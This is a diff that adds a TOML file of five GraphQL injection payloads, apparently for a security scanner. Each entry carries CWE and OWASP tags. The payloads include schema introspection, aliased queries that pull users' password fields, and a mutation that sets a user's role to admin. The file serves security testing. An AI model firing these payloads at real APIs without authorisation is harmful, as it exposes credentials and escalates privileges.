@@ -1,0 +1,51 @@
+# GraphQL Injection Payloads
+
+[[payloads]]
+id = "gql-001"
+name = "GraphQL Introspection Query"
+category = "GraphQLInjection"
+pattern = "{\"query\": \"{ __schema { types { name } } }\"}"
+description = "GraphQL introspection to enumerate schema and types"
+risk_level = "MEDIUM"
+cwe_id = "CWE-200"
+owasp_category = "A01:2021"
+
+[[payloads]]
+id = "gql-002"
+name = "GraphQL Type Introspection"
+category = "GraphQLInjection"
+pattern = "{\"query\": \"{ __type(name: \\\"User\\\") { fields { name type { name } } } }\"}"
+description = "Introspect specific type fields"
+risk_level = "MEDIUM"
+cwe_id = "CWE-200"
+owasp_category = "A01:2021"
+
+[[payloads]]
+id = "gql-003"
+name = "GraphQL Batch Query Abuse"
+category = "GraphQLInjection"
+pattern = "query { user(id: \"1\") { name } user(id: \"2\") { name } }"
+description = "GraphQL batching to extract multiple records in single request"
+risk_level = "HIGH"
+cwe_id = "CWE-89"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "gql-004"
+name = "GraphQL Field Aliasing"
+category = "GraphQLInjection"
+pattern = "query { alias1: user(id: 1) { password } alias2: user(id: 2) { password } }"
+description = "GraphQL aliasing to extract sensitive data fields"
+risk_level = "HIGH"
+cwe_id = "CWE-200"
+owasp_category = "A01:2021"
+
+[[payloads]]
+id = "gql-005"
+name = "GraphQL Mutation Injection"
+category = "GraphQLInjection"
+pattern = "mutation { updateUser(id: 1, role: \"admin\") { id role } }"
+description = "GraphQL mutation to escalate privileges"
+risk_level = "HIGH"
+cwe_id = "CWE-269"
+owasp_category = "A01:2021"
